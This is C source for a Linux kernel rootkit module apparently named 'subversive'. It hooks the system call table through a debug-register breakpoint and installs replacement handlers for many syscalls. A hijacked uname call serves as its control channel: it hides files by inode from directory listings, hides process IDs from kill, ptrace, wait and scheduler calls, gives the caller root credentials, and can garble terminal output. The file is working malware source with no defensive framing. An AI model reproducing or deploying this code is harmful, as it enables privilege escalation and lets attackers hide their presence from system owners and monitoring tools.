#include <linux/kernel.h>
#include <linux/cred.h>
#include <linux/perf_event.h>
#include <asm/ptrace.h>
#include <asm/unistd.h>
#include <asm/siginfo.h>

#include <subversive/config.h>
#include <subversive/arch.h>
#include <subversive/structs.h>
#include <subversive/dr_breakpoint.h>
#include <subversive/subversive_ctl.h>

#define SYSCALL(sys, args...) ((long(*)())sct[__NR_##sys])(args)
#define HOOK(sys, func) fake_sct[__NR_##sys] = (unsigned long)func

static unsigned long fake_sct[320];
static unsigned long *sct;

static int lulz_mode = 0;
/*
 * for the lulz
 */
asmlinkage long new_sys_write(unsigned int fd, char *buf, size_t count)
{
	int i;

	if (lulz_mode && (fd == 1 || fd == 2)) {
		for (i = 0; i < count; i++) {
			switch (buf[i]) {
			case 'a':
				buf[i] = '4';
				break;
			case 'e':
				buf[i] = '3';
				break;
			case 'i':
				buf[i] = '1';
				break;
			case 'o':
				buf[i] = '0';
				break;
			case 's':
				buf[i] = '5';
				break;
			}
		}
	}

	return SYSCALL(write, fd, buf, count);
}


static u64 hidden_inodes[MAX_HIDDEN_INODES];

static int is_inode_hidden(u64 ino)
{
	int i;

	for (i = 0; i < MAX_HIDDEN_INODES; i++)
		if (hidden_inodes[i] == ino)
			return 1;
	return 0;
}

static void hide_inode(u64 ino)
{
	int i;

	for (i = 0; i < MAX_HIDDEN_INODES; i++) {
		if (!hidden_inodes[i] || hidden_inodes[i] == ino) {
			hidden_inodes[i] = ino;
			break;
		}
	}
}

static void unhide_inode(u64 ino)
{
	int i;

	for (i = 0; i < MAX_HIDDEN_INODES; i++) {
		if (hidden_inodes[i] == ino) {
			hidden_inodes[i] = 0;
			break;
		}
	}
}

asmlinkage long new_sys_getdents(unsigned int fd, struct linux_dirent *dirp, size_t count)
{
	int pos;
	long ret;

	ret = SYSCALL(getdents, fd, dirp, count);
	if (ret <= 0)
		return ret;

	for (pos = 0; pos < ret; ) {
		char *ptr = (char *)dirp + pos;
		struct linux_dirent *d = (struct linux_dirent *)ptr;

		if (is_inode_hidden(d->d_ino)) {
			memcpy(d, (char *)d + d->d_reclen, ret - pos - d->d_reclen);
			ret -= d->d_reclen;
		} else {
			pos += d->d_reclen;
		}
	}

	return ret;
}

asmlinkage long new_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp, size_t count)
{
	int pos;
	long ret;

	ret = SYSCALL(getdents64, fd, dirp, count);
	if (ret <= 0)
		return ret;

	for (pos = 0; pos < ret; ) {
		char *ptr = (char *)dirp + pos;
		struct linux_dirent64 *d = (struct linux_dirent64 *)ptr;

		if (is_inode_hidden(d->d_ino)) {
			memcpy(d, (char *)d + d->d_reclen, ret - pos - d->d_reclen);
			ret -= d->d_reclen;
		} else {
			pos += d->d_reclen;
		}
	}

	return ret;
}

static int hidden_pids[MAX_HIDDEN_PIDS];

static int is_pid_hidden(int pid)
{
	int i;

	for (i = 0; i < MAX_HIDDEN_PIDS; i++)
		if (hidden_pids[i] == pid)
			return 1;

	return 0;
}

static void hide_pid(int pid)
{
	int i;

	for (i = 0; i < MAX_HIDDEN_PIDS; i++) {
		if (!hidden_pids[i] || hidden_pids[i] == pid) {
			hidden_pids[i] = pid;
			break;
		}
	}
}

static void unhide_pid(int pid)
{
	int i;

	for (i = 0; i < MAX_HIDDEN_PIDS; i++) {
		if (hidden_pids[i] == pid) {
			hidden_pids[i] = 0;
			break;
		}
	}
}

#define RETURN_PID_HIDDEN(pid)						\
	do {								\
		if (is_pid_hidden(pid) && SYSCALL(getpid) != pid)	\
			return -ESRCH;					\
	} while (0)

asmlinkage long new_sys_getpgid(pid_t pid)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(getpgid, pid);
}

asmlinkage long new_sys_getsid(pid_t pid)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(getsid, pid);
}

asmlinkage long new_sys_setpgid(pid_t pid, pid_t pgid)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(setpgid, pid, pgid);
}

asmlinkage long new_sys_kill(int pid, int sig)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(kill, pid, sig);
}

asmlinkage long new_sys_tgkill(int tgid, int pid, int sig)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(tgkill, tgid, pid, sig);
}

asmlinkage long new_sys_tkill(int pid, int sig)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(tkill, pid, sig);
}

asmlinkage long new_sys_sched_setscheduler(pid_t pid, int policy,
						struct sched_param *param)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(sched_setscheduler, pid, policy, param);
}

asmlinkage long new_sys_sched_setparam(pid_t pid, struct sched_param *param)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(sched_setparam, pid, param);
}

asmlinkage long new_sys_sched_getscheduler(pid_t pid)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(sched_getscheduler, pid);
}

asmlinkage long new_sys_sched_getparam(pid_t pid, struct sched_param *param)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(sched_getparam, pid, param);
}

asmlinkage long new_sys_sched_setaffinity(pid_t pid, unsigned int len,
					unsigned long *user_mask_ptr)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(sched_setaffinity, pid, len, user_mask_ptr);
}

asmlinkage long new_sys_sched_getaffinity(pid_t pid, unsigned int len,
					unsigned long *user_mask_ptr)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(sched_getaffinity, pid, len, user_mask_ptr);
}

asmlinkage long new_sys_sched_rr_get_interval(pid_t pid, struct timespec *interval)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(sched_rr_get_interval, pid, interval);
}

asmlinkage long new_sys_wait4(pid_t pid, int *stat_addr,
				int options, struct rusage *ru)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(wait4, pid, stat_addr, options, ru);
}

asmlinkage long new_sys_waitid(int which, pid_t pid,
				struct siginfo *infop,
				int options, struct rusage *ru)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(waitid, which, pid, infop, options, ru);
}

asmlinkage long new_sys_rt_tgsigqueueinfo(pid_t tgid, pid_t pid, int sig,
					siginfo_t *uinfo)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(rt_tgsigqueueinfo, tgid, pid, sig, uinfo);
}

asmlinkage long new_sys_rt_sigqueueinfo(int pid, int sig, siginfo_t *uinfo)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(rt_sigqueueinfo, pid, sig, uinfo);
}

asmlinkage long new_sys_prlimit64(pid_t pid, unsigned int resource,
				const struct rlimit64 *new_rlim,
				struct rlimit64 *old_rlim)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(prlimit64, pid, resource, new_rlim, old_rlim);
}

asmlinkage long new_sys_ptrace(long request, long pid, unsigned long addr,
				unsigned long data)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(ptrace, request, pid, addr, data);
}

asmlinkage long new_sys_migrate_pages(pid_t pid, unsigned long maxnode,
					const unsigned long *from,
					const unsigned long *to)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(migrate_pages, pid, maxnode, from, to);
}

asmlinkage long new_sys_move_pages(pid_t pid, unsigned long nr_pages,
				const void **pages,
				const int *nodes,
				int *status,
				int flags)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(move_pages, nr_pages, pages, nodes, status, flags);
}

asmlinkage long new_sys_get_robust_list(int pid,
					struct robust_list_head **head_ptr,
					size_t *len_ptr)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(get_robust_list, pid, head_ptr, len_ptr);
}

asmlinkage long new_sys_perf_event_open(
                struct perf_event_attr *attr_uptr,
                pid_t pid, int cpu, int group_fd, unsigned long flags)
{
	RETURN_PID_HIDDEN(pid);
	return SYSCALL(perf_event_open, attr_uptr, pid, cpu, group_fd, flags);
}


static inline void give_root_creds(void)
{
	commit_creds(prepare_kernel_cred(NULL));
}

/*
 * rookit interface
 */
asmlinkage long new_sys_newuname(struct new_utsname *name)
{
	struct rk_args *args = (struct rk_args *)name;

	switch (args->mode) {
	case HIDE_INODE:
		hide_inode(args->param1);
		break;
	case UNHIDE_INODE:
		unhide_inode(args->param1);
		break;
	case LULZ_MODE:
		lulz_mode = args->param1;
		break;
	case GET_ROOT:
		give_root_creds();
		break;
	case HIDE_PID:
		hide_pid(args->param1);
		break;
	case UNHIDE_PID:
		unhide_pid(args->param1);
		break;
	}
	
	memset(name, 0, sizeof(*name));
	return SYSCALL(uname, name);
}

void system_call_hook(struct pt_regs *regs)
{
	/*
	 * call *sys_call_table(,%rax,8)
	 */
	unsigned long off = ((unsigned long)fake_sct - (unsigned long)sct);
	regs->ax += off / sizeof(unsigned long);
}

int hook_sys_call_table(void)
{
	memset(hidden_inodes, 0, ARRAY_SIZE(hidden_inodes));
	memset(hidden_pids, 0, ARRAY_SIZE(hidden_pids));

	find_sys_call_table();
	sct = (unsigned long *)sys_call_table;
	if (!sct)
		return -1;

	memcpy(fake_sct, sct, sizeof(fake_sct));

	HOOK(uname, new_sys_newuname);
	HOOK(write, new_sys_write);
	HOOK(getdents, new_sys_getdents);
	HOOK(getdents64, new_sys_getdents64);

	HOOK(getpgid, new_sys_getpgid);
	HOOK(getsid, new_sys_getsid);
	HOOK(setpgid, new_sys_setpgid);
	HOOK(kill, new_sys_kill);
	HOOK(tgkill, new_sys_tgkill);
	HOOK(tkill, new_sys_tkill);
	HOOK(sched_setscheduler, new_sys_sched_setscheduler);
	HOOK(sched_setparam, new_sys_sched_setparam);
	HOOK(sched_getscheduler, new_sys_sched_getscheduler);
	HOOK(sched_getparam, new_sys_sched_getparam);
	HOOK(sched_setaffinity, new_sys_sched_setaffinity);
	HOOK(sched_getaffinity, new_sys_sched_getaffinity);
	HOOK(sched_rr_get_interval, new_sys_sched_rr_get_interval);
	HOOK(wait4, new_sys_wait4);
	HOOK(waitid, new_sys_waitid);
	HOOK(rt_tgsigqueueinfo, new_sys_rt_tgsigqueueinfo);
	HOOK(rt_sigqueueinfo, new_sys_rt_sigqueueinfo);
	HOOK(prlimit64, new_sys_prlimit64);
	HOOK(ptrace, new_sys_ptrace);
	HOOK(migrate_pages, new_sys_migrate_pages);
	HOOK(move_pages, new_sys_move_pages);
	HOOK(get_robust_list, new_sys_get_robust_list);
	HOOK(perf_event_open, new_sys_perf_event_open);


	register_dr_breakpoint(sys_call_table_call, DR_RW_EXECUTE, 0,
				system_call_hook);

	return 0;
}
